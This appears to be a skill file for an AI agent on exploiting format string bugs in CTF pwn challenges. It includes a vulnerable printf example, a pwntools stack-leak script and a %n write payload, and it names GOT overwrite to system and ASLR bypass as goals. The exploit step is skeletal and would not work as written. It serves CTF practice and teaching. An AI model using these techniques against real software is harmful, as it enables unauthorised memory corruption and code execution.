---
name: ctf-pwn-format-string
description: Format string vulnerability exploitation techniques
tags: [pwn, format-string, exploitation]
prerequisites: [binary_file]
---

# CTF Pwn - Format String Exploitation

## When to Use
Use for:
- Leaking memory contents
- Overwriting GOT entries
- Achieving arbitrary read/write
- Bypassing ASLR

## Decision Framework
1. Identify format string vulnerability
2. Calculate offset to controlled input
3. Leak libc address
4. Overwrite GOT or return address

## Execution Steps

### Step 1: Identify Vulnerability
```c
// Vulnerable code
printf(user_input);  // Should be printf("%s", user_input)
```

### Step 2: Leak Memory
```python
from pwn import *

p = process('./challenge')

# Leak stack
payload = "%p." * 20
p.sendline(payload)
print(p.recvall())
```

### Step 3: Exploit
```python
# Calculate offset
offset = 6  # Found from leak

# Build exploit
payload = "%{}$n".format(offset)
p.sendline(payload)
```

## Expected Output Format
```
Format String Analysis:
  - Offset found: 6
  - Memory leaked: 0x7f...
  - GOT overwritten: printf -> system
```

## Common Pitfalls
- Wrong offset corrupts wrong memory
- Format string length matters
- Some protections may block %n
- Always test incrementally
